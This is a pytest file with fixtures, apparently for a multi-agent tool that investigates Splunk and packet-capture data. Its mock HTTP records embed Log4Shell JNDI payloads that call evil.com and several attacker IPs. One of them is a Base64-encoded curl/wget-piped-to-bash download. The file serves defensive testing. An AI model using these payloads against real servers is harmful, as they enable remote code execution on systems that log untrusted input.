import os
import sys
import json
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
os.environ["SPLUNK_PASS"] = "test-pass"
os.environ["SPLUNK_HOST"] = "https://splunk-test:8089"
os.environ["PCAP_DIRECTORY"] = "/tmp"
os.environ["OLLAMA_HOST"] = "http://ollama-test:11434"

import multi_agent as ma


def load_fixture(name: str) -> str:
    path = os.path.join(os.path.dirname(__file__), "fixtures", name)
    with open(path) as f:
        return f.read()


@pytest.fixture
def pdf_splunk_results() -> list[dict]:
    return json.loads(load_fixture("pdf_splunk_results.json"))


@pytest.fixture
def pdf_pcap_expected() -> dict:
    return json.loads(load_fixture("pdf_pcap_expected.json"))


@pytest.fixture
def pdf_reference_data() -> dict:
    return json.loads(load_fixture("pdf_reference_data.json"))


@pytest.fixture
def sample_tshark_json():
    return json.dumps(
        [
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["1"],
                            "frame.time": ["Jul 26, 2026 12:00:00.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["192.168.1.1"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.68.0"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["2"],
                            "frame.time": ["Jul 26, 2026 12:00:01.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.2"], "ip.dst": ["10.0.0.3"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["POST"],
                            "http.request.uri": [
                                "/?x=${jndi:ldap://evil.com:1389/a}"
                            ],
                            "http.user_agent": ["Mozilla/5.0"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": ["${jndi:ldap://10.0.0.5:1389/exploit}"],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["3"],
                            "frame.time": ["Jul 26, 2026 12:00:02.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.4"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["LDAP"]},
                        "http": {},
                        "tcp": {"tcp.dstport": ["1389"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["4"],
                            "frame.time": ["Jul 26, 2026 12:00:03.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["8.8.8.8"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/cb"],
                            "http.user_agent": ["python-requests/2.31"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["5"],
                            "frame.time": ["Jul 26, 2026 12:00:04.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/normal"],
                            "http.user_agent": ["Mozilla/5.0"],
                            "http.file_data": [""],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
        ]
    )


@pytest.fixture
def sample_dns_json():
    return json.dumps(
        [
            {
                "_source": {
                    "layers": {
                        "frame": {
                            "frame.number": ["6"],
                            "frame.time": ["Jul 26, 2026 12:00:05.000 UTC"],
                        },
                        "ip": {"ip.src": ["10.0.0.1"], "ip.dst": ["8.8.8.8"]},
                        "dns": {
                            "dns.qry.name": ["evil-callback.com"],
                            "dns.flags.response": ["0"],
                        },
                    }
                }
            }
        ]
    )


@pytest.fixture
def pdf_tshark_pcapA_json():
    return json.dumps(
        [
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["1"], "frame.time": ["Jul 24, 2026 22:48:40.000 UTC"]},
                        "ip": {"ip.src": ["195.54.160.149"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["POST"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.68.0"],
                            "http.file_data": ["${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["2"], "frame.time": ["Jul 24, 2026 22:48:40.000 UTC"]},
                        "ip": {"ip.src": ["175.6.210.66"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["Mozilla/5.0"],
                            "http.file_data": ["${jndi:ldap://121.140.99.236:1389/Exploit}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["3"], "frame.time": ["Jul 26, 2026 20:18:49.000 UTC"]},
                        "ip": {"ip.src": ["195.54.160.149"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["POST"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.68.0"],
                            "http.file_data": ["${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["4"], "frame.time": ["Jul 26, 2026 20:18:49.000 UTC"]},
                        "ip": {"ip.src": ["175.6.210.66"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["Mozilla/5.0"],
                            "http.file_data": ["${jndi:ldap://121.140.99.236:1389/Exploit}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["5"], "frame.time": ["Jul 28, 2026 17:16:59.000 UTC"]},
                        "ip": {"ip.src": ["195.54.160.149"], "ip.dst": ["10.0.0.5"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["POST"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.68.0"],
                            "http.file_data": ["${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
        ]
    )


@pytest.fixture
def pdf_tshark_pcapB_json():
    return json.dumps(
        [
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["10"], "frame.time": ["Jul 24, 2026 22:49:00.000 UTC"]},
                        "ip": {"ip.src": ["104.248.144.120"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["python-requests/2.31"],
                            "http.file_data": ["${jndi:ldap://31.131.16.127:1389/Exploit}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["11"], "frame.time": ["Jul 24, 2026 22:49:00.000 UTC"]},
                        "ip": {"ip.src": ["46.105.95.220"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["Go-http-client/2.0"],
                            "http.file_data": ["${jndi:ldap://31.131.16.127:1389/Exploit}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["12"], "frame.time": ["Jul 24, 2026 22:49:00.000 UTC"]},
                        "ip": {"ip.src": ["5.157.38.50"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["GET"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.74.0"],
                            "http.file_data": ["${jndi:ldap://5.101.118.127:1389/Exploit}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["13"], "frame.time": ["Jul 24, 2026 22:49:00.000 UTC"]},
                        "ip": {"ip.src": ["195.54.160.149"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["HTTP"]},
                        "http": {
                            "http.request.method": ["POST"],
                            "http.request.uri": ["/"],
                            "http.user_agent": ["curl/7.68.0"],
                            "http.file_data": ["${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"],
                        },
                        "tcp": {"tcp.dstport": ["80"]},
                        "text": [""],
                    }
                }
            },
            {
                "_source": {
                    "layers": {
                        "frame": {"frame.number": ["14"], "frame.time": ["Jul 28, 2026 17:17:22.000 UTC"]},
                        "ip": {"ip.src": ["198.71.247.91"], "ip.dst": ["10.0.0.6"]},
                        "_ws": {"_ws.col.Protocol": ["LDAP"]},
                        "http": {},
                        "tcp": {"tcp.dstport": ["1389"]},
                        "text": [""],
                    }
                }
            },
        ]
    )
